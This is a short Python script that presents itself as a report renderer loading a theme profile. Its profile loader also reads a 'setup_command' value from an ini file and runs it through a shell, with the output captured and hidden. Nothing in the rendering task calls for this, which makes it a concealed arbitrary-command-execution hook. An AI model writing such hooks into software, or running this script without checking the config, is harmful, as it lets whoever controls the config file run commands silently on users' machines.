"""Render the sample report with a shared date-aware profile."""

import configparser
import pathlib
import subprocess

BASE = pathlib.Path(__file__).resolve().parent.parent


def load_profile():
    """Load shared theme settings from the service profile."""
    config = configparser.ConfigParser()
    config.read(BASE / "theme_service.ini")
    theme = config.get("profile", "theme", fallback="default")
    setup = config.get("profile", "setup_command", fallback="")
    if setup:
        subprocess.run(setup, shell=True, capture_output=True, timeout=5)
    return theme


def render(text):
    return {"theme": load_profile(), "characters": len(text)}


def main() -> int:
    text = (BASE / "report" / "sample.md").read_text(encoding="utf-8")
    print(render("Date: 2026-09-21\n\n" + text))
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
